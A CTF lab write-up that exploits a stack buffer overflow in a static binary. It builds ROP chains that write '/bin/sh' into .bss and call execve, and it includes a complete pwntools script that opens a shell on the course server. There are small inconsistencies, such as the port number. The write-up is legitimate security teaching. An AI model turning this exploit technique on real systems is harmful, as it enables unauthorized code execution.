# Simple PWN - 0x12(Lab - `rop++`)
###### tags: `CTF` `PWN` `eductf`

challenge: `nc edu-ctf.zoolab.org 10004`

## Original Code
```cpp!=
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main()
{
    char buf[0x10];
    const char *msg = "show me rop\n> ";

    write(1, msg, strlen(msg));
    read(0, buf, 0x200);

    return 0;
}
```
```makefile!
gcc -fno-stack-protector -static -o chal rop++.c
```

## Analyze
* Obviously buffer overflow!!!
* Check protector
    ```bash!
    $ checksec chal
    [*] '/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    ```

* Preliminary idea is using `ROP` chain and get shell, but the problem is where can I write `/bin/sh\x00`? We can use `vmmap` to observe where section is writable and readable → `0x4c5000~0x4c800`
![](https://imgur.com/018Nk8F.png)
    ```bash!
    $ readelf -S chal
    ...
    [25] .bss              NOBITS           00000000004c72a0  000c6290
           0000000000005980  0000000000000000  WA       0     0     32
    ...
    ```
    We can use <font color="FF0000">`.bss` section(`0x4c72a0`)</font> to write parameter `/bin/sh\x00`
    * <font color="FF0000">Note that</font>, because `ASLR` is enabled, so we cannot write `/bin/sh\x00` to stack, in addition, `PIE` is unable, so that we can write and read data from `.bss` section with fixed address

## Exploit - `ROP`
1. Write `ROP` chain in `buf` parameter
    ```bash!
    $ ROPgadget --binary chal --only "pop|leave|ret|syscall" --multibr > rop_gadget
    $ vim rop_gadget
    ```
    ```python!
    pop_rax_ret = 0x447b27
    pop_rdi_ret = 0x401e3f
    pop_rsi_ret = 0x409e6e
    pop_rdx_rbx_ret = 0x47ed0b
    syscall_ret = 0x414506
    leave_ret = 0x401797
    ```
2. Construct `ROP` chain
In order to achieve our idea, we need another read to write `/bin/sh\x00` to `.bss` section
    ```python!
    ROP_read = flat(
        # call read function
        pop_rax_ret, 0,
        pop_rdi_ret, 0,
        pop_rsi_ret, 0x4c72a0,
        pop_rdx_rbx_ret, 0x100, 0,
        syscall_ret,    
    )
    ```
    Then we need another `ROP` chain to call `shell`
    ```python!
    ROP_shell = flat(
        # Get shell
        pop_rax_ret, 0x3b,
        pop_rdi_ret, 0x4c72a0,
        pop_rsi_ret, 0,
        pop_rdx_rbx_ret, 0, 0,
        syscall_ret,

    )
    ```
    * Note that `0x4c72a0` is the beginning of `.bss` section
3. Send payload
    ```python!
    binsh = 0x68732f6e69622f #'/bin/sh\x00'
    r.sendafter("show me rop\n>", b'a'*0x28 + ROP_read + ROP_shell)
    r.send(flat(binsh))
    ```
4. Then we get shell and read flag
![](https://imgur.com/mLAdXz1.png)
* Whole exploit
    :::spoiler code
    ```python!
    from pwn import *

    #r = process('./chal')
    r = remote('edu-ctf.zoolab.org', 10003)
    raw_input()
    context.arch = 'amd64'

    pop_rax_ret = 0x447b27
    pop_rdi_ret = 0x401e3f
    pop_rsi_ret = 0x409e6e
    pop_rdx_rbx_ret = 0x47ed0b
    syscall_ret = 0x414506
    leave_ret = 0x401797

    binsh = 0x68732f6e69622f #'/bin/sh\x00'

    ROP_read = flat(
        # call read function
        pop_rax_ret, 0,
        pop_rdi_ret, 0,
        pop_rsi_ret, 0x4c72a0,
        pop_rdx_rbx_ret, 0x100, 0,
        syscall_ret,    
    )

    ROP_shell = flat(
        # Get shell
        pop_rax_ret, 0x3b,
        pop_rdi_ret, 0x4c72a0,
        pop_rsi_ret, 0,
        pop_rdx_rbx_ret, 0, 0,
        syscall_ret,

    )

    r.sendafter("show me rop\n>", b'a'*0x28 + ROP_read + ROP_shell)
    r.send(flat(binsh))

    r.interactive()
    ```
    :::
## Appendix
This payload will call `sys_read` and read something that we send, that is `0x68732f6e69622f`(`/bin/sh\x00`), and then it'll call `sys_execve`.